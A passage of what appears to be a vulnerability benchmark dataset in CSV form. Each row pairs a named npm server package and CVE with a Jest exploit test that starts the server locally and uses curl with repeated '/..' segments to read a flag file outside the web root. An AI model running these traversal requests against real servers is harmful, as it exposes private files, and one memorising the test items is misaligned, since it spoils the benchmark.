function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in wffserve"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/wffserve/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:24:8,https://security.snyk.io/vuln/npm:wffserve:20170525; https://github.com/advisories/GHSA-wqr3-24xm-fxhq
path-traversal,CVE-2017-16220,wind-mvc,0.0.6,,path-traversal/wind-mvc_0.0.6,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in wind-mvc"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/wind-mvc/app.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,lib/util/util4HTML.js:7:5,https://security.snyk.io/vuln/npm:wind-mvc:20170503; https://github.com/advisories/GHSA-7g8m-5qh9-9pgw
path-traversal,CVE-2016-10561,bitty,0.1.0,,path-traversal/bitty_0.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 4000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in bitty"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 4000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/bitty/index.js"";
  exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:4000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:36:10,https://security.snyk.io/vuln/npm:bitty:20161014; https://github.com/advisories/GHSA-f5mh-hq6h-whxv
path-traversal,CVE-2017-16187,open-device,4.0.1,,path-traversal/open-device_4.0.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in open-device"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/open-device/broadcast.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,lib/server-accessible.js:14:12,https://security.snyk.io/vuln/npm:open-device:20170430; https://github.com/advisories/GHSA-jpjp-vxv6-59hm
path-traversal,,static-server-gx,1.2.1,,path-traversal/static-server-gx_1.2.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 10000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in static-server-gx"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 10000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/static-server-gx/server.js"";
  exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:10000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,server.js:7:9,https://security.snyk.io/vuln/SNYK-JS-STATICSERVERGX-609517; 
path-traversal,CVE-2017-16090,fsk-server,0.2.1,,path-traversal/fsk-server_0.2.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 3001/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in fsk-server"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 3001/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/fsk-server/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:3001${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:48:23,https://security.snyk.io/vuln/npm:fsk-server:20170419; https://github.com/advisories/GHSA-c3hr-wwh3-qm54
path-traversal,CVE-2017-16148,serve46,1.0.0,,path-traversal/serve46_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serve46"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serve46/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:19:8,https://security.snyk.io/vuln/npm:serve46:20170612; https://github.com/advisories/GHSA-qw9c-8p76-3q2x
path-traversal,,nitro-server,1.3.3,,path-traversal/nitro-server_1.3.3,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in nitro-server"", (done) => {
  expect.assertions(1);
  const pkg = require(""nitro-server"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  pkg.start("""");
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,server.js:148:10,https://security.snyk.io/vuln/npm:nitro-server:20180226; 
path-traversal,,lihuini,1.0.0,,path-traversal/lihuini_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in lihuini"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/lihuini/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:5:8,https://security.snyk.io/vuln/npm:lihuini:20170730; 
path-traversal,CVE-2017-16198,ritp,1.0.5,,path-traversal/ritp_1.0.5,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in ritp"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/ritp/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:53:37,https://security.snyk.io/vuln/npm:ritp:20170508; https://github.com/advisories/GHSA-gf7h-vg5v-cch6
path-traversal,CVE-2017-16185,uekw1511server,1.0.1,,path-traversal/uekw1511server_1.0.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in uekw1511server"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/uekw1511server/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:14:17,https://security.snyk.io/vuln/npm:uekw1511server:20170509; https://github.com/advisories/GHSA-pm44-7gw9-6g8p
path-traversal,,ltt.js,1.0.0,,path-traversal/ltt.js_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in ltt.js"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/ltt.js/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:7:8,https://security.snyk.io/vuln/npm:ltt.js:20170503; https://github.com/advisories/GHSA-6qh5-wx38-q92g
path-traversal,,hdsdhhksjd,1.0.0,,path-traversal/hdsdhhksjd_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in hdsdhhksjd"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/hdsdhhksjd/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:7:8,https://security.snyk.io/vuln/npm:hdsdhhksjd:20180315; 
path-traversal,CVE-2018-16479,http-live-simulator,1.0.0,1.0.7,path-traversal/http-live-simulator_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in http-live-simulator"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/http-live-simulator/bin/http-live"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,bin/http-live:55:7,https://security.snyk.io/vuln/SNYK-JS-HTTPLIVESIMULATOR-73554; https://github.com/advisories/GHSA-7c9w-qmrq-ff8r
path-traversal,CVE-2017-16193,mfrs,1.0.0,,path-traversal/mfrs_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in mfrs"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/mfrs/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
}, 30000);
",,index.js:6:8,https://security.snyk.io/vuln/npm:mfrs:20170427; https://github.com/advisories/GHSA-jjgw-jf33-7fg9
path-traversal,CVE-2017-16149,zwserver,0.1.1,,path-traversal/zwserver_0.1.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in zwserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/zwserver/server.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,server.js:32:6,https://security.snyk.io/vuln/npm:zwserver:20170516; https://github.com/advisories/GHSA-whcm-29f4-j4mx
path-traversal,CVE-2017-16085,tinyserver2,0.5.2,0.6.1,path-traversal/tinyserver2_0.5.2,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8976/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in tinyserver2"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8976/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/tinyserver2/tinyserver.js -p 8976"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8976${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,tinyserver.js:27:6,https://security.snyk.io/vuln/npm:tinyserver2:20170503; https://github.com/advisories/GHSA-g8wf-rcg3-qw4q
path-traversal,CVE-2017-16147,shit-server,1.0.0,,path-traversal/shit-server_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in shit-server"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/shit-server/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:76:8,https://security.snyk.io/vuln/npm:shit-server:20170511; https://github.com/advisories/GHSA-6x8c-mvpv-5366
path-traversal,,wrlc,0.2.5,,path-traversal/wrlc_0.2.5,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in wrlc"", (done) => {
  expect.assertions(1);
  const pkg = require(""wrlc"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8972/tcp"", () => {});
  } catch (e) {}
  pkg.serve(
    {
      port: 8972,
      host: ""localhost"",
    },
    () => {}
  );
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8972${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:26:25,https://security.snyk.io/vuln/npm:wrlc:20180306; 
path-traversal,,isv-http,0.0.9,,path-traversal/isv-http_0.0.9,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in isv-http"", (done) => {
  expect.assertions(1);
  const pkg = require(""isv-http"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9527/tcp"", () => {});
  } catch (e) {}
  pkg.runserver();
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9527${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:47:20,https://security.snyk.io/vuln/npm:isv-http:20180226; 
path-traversal,,zhaolei1111,1.1.0,,path-traversal/zhaolei1111_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8035/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in zhaolei1111"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8035/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/zhaolei1111/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8035${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:5:8,https://security.snyk.io/vuln/npm:zhaolei1111:20180315; 
path-traversal,,gamebutler,1.0.4,,path-traversal/gamebutler_1.0.4,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in gamebutler"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server =
    ""node ./node_modules/gamebutler/build/gamebutler.js ../flag.html"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,build/gamebutler.js:69:43,https://security.snyk.io/vuln/npm:gamebutler:20180226; 
path-traversal,CVE-2017-16121,datachannel-client,1.0.2,,path-traversal/datachannel-client_1.0.2,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in datachannel-client"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/datachannel-client/server.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,server.js:30:12,https://security.snyk.io/vuln/npm:datachannel-client:20170418; https://github.com/advisories/GHSA-jpg7-6c9f-7q54
path-traversal,,rjpserver,1.0.0,,path-traversal/rjpserver_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in rjpserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/rjpserver/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    done();
  });
});
",,index.js:8:8,https://security.snyk.io/vuln/npm:rjpserver:20180315; 
path-traversal,CVE-2017-16214,peiserver,1.0.0,,path-traversal/peiserver_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in peiserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/peiserver/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    done();
  });
});
",,index.js:13:8,https://security.snyk.io/vuln/npm:peiserver:20170518; https://github.com/advisories/GHSA-74f5-4m28-gq5c
path-traversal,,api-proxy,0.0.2,,path-traversal/api-proxy_0.0.2,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in api-proxy"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  require(""api-proxy"").start(8888);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,lib/static.js:40:9,https://security.snyk.io/vuln/npm:api-proxy:20180226; 
path-traversal,,server12311,1.2.0,,path-traversal/server12311_1.2.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in server12311"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/server12311/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:5:8,https://security.snyk.io/vuln/npm:server12311:20180226; 
path-traversal,CVE-2017-16095,serverliujiayi1,1.1.0,,path-traversal/serverliujiayi1_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverliujiayi1"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverliujiayi1/index.js"";
  let exe = exec(server, (error, stdout) => {});
